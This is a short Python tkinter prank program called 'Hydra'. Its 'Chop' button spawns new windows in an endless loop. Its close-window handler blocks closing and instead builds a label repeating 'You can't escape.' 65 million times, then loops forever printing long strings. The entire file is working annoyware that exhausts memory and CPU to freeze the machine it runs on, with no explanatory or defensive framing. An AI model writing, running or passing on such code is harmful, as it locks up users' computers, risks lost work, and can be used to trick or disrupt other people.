import tkinter as tk






class myHydra:

    def __init__(self):

#window
        
        self.window = tk.Tk()
        self.geo = self.window.geometry("500x100")
        self.title = self.window.title("Hydra")
        self.window.configure(bg='PaleVioletRed1')
        
       
       
#text
        self.windowlabel = tk.Label(self.window, text="Chop it's head, it becomes two.",bg='PaleVioletRed1', font=('Arial', 10))
        self.windowlabel.pack(padx=10, pady=10)
#button
        self.btn1 = tk.Button(self.window,bg='PaleVioletRed4', text='Chop', font=('Arial', 10),command=self.multiply)
        self.btn1.pack(padx=10,pady=10)
        self.window.protocol("WM_DELETE_WINDOW", self.x_button)
        self.window.configure(bg='PaleVioletRed1')

        

        self.window.mainloop()
        
        
                

#multiply
    def multiply(self):

        while True:
            print('heheasdfghjkl;qwertyuiop[]zxcvbnm,.')
            myHydra()
        


    def x_button(self):

        while True:

            self.window2 = tk.Tk()
            self.geo2 = self.window2.geometry("500x500")
            self.title2 = self.window2.title("Hydra")
            self.window2.configure(bg='PaleVioletRed1')
       
       
#text
            self.windowlabel2 = tk.Label(self.window2,text="You can't escape." * 65000000 ,bg='PaleVioletRed1', font=('Arial', 10))
            self.windowlabel2.pack(padx=10, pady=10)
#button
            self.btn2 = tk.Button(self.window2,bg='PaleVioletRed4', text='Chop', font=('Arial', 10),command=self.multiply)
            self.btn2.pack(padx=10,pady=10)
            self.window2.protocol("WM_DELETE_WINDOW", self.x_button)
            self.window2.configure(bg='PaleVioletRed1')
            while True:
                print('asdfghjklqwertyuiopzxcvbnm,.74108520963.0'*3000)

            
                while True:
                    pass
            

        

                self.window2.mainloop()
        

    

myHydra()




            




